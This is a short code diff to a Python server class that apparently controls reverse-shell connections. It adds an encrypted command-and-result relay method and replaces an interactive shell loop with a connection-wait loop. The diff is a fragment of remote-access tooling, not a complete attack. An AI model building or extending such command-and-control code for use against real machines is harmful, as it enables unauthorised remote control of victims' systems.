@@ -65,7 +65,7 @@ class Server(object):
             time.sleep(self.sleepPeriter)
                                
              
-    def sendMsg(self, connection,msg):
+    def sendMsg(self, connection, msg):
         msg = connection.aes.encrypt(msg)
         connection.conn.send(
             int.to_bytes(
@@ -82,27 +82,20 @@ class Server(object):
         while len(res) < header:
             res += connection.conn.recv(header-len(res))
         return connection.aes.decrypt(res)
-        
-        
-    def readCommand(self,connection):
-        command = self._internalclient._read_msg().decode(errors='replace')
-        self.sendMsg(connection,command.encode())
     
-
-    def outResult(self,connection):
-        self._internalclient._send_msg(self.recvMsg(connection))
-
+    
+    def retriveCommand(self,connection, command):
+        command = self.sendMsg(connection,command)
+        return self.recvMsg(connection)
+        
 
     def _setShellMode(self,conn):
         print('Satrting RevrseShell...')
         self.setCipher(conn)
-        fixedConnection = self.connections.getFixedConnection(conn)
-        while True:
-            command = self.readCommand(fixedConnection)
-            if command == 'exit':
-                break
-            self.outResult(fixedConnection)
-            time.sleep(0.5)
+        ip = conn.getpeername()[0]
+        while self.connections.isconnected(ip):
+            time.sleep(5)
+        self.connections.removeConnection(conn)
         
     
     def __listener__(self):
